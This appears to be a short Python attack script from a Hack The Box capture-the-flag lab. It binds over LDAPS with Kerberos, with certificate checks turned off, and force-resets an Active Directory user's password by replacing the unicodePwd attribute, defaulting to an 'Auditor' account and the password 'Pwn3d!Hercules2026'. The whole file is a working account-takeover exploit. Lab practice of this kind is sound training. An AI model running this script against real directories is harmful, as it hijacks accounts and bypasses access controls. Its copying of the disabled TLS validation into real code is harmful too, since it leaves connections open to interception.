#!/usr/bin/env python3
"""Force-change a password (user-Force-Change-Password) over LDAPS using Kerberos.

usage: set_pwd.py <target-dn> <new-password>
"""
import sys, ssl
from ldap3 import Server, Connection, ALL, SASL, KERBEROS, Tls
from ldap3.core.exceptions import LDAPException

DN = sys.argv[1] if len(sys.argv) > 1 else "CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb"
NEW = sys.argv[2] if len(sys.argv) > 2 else "Pwn3d!Hercules2026"

tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLS_CLIENT)
s = Server("dc.hercules.htb", port=636, use_ssl=True, tls=tls, get_info=ALL)
c = Connection(s, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
print("bound as:", c.extend.standard.who_am_i())

ok = c.modify(DN, {"unicodePwd": [("MODIFY_REPLACE", ('"%s"' % NEW).encode("utf-16-le"))]})
print("modify:", ok, c.result.get("description"), c.result.get("message"))
c.unbind()
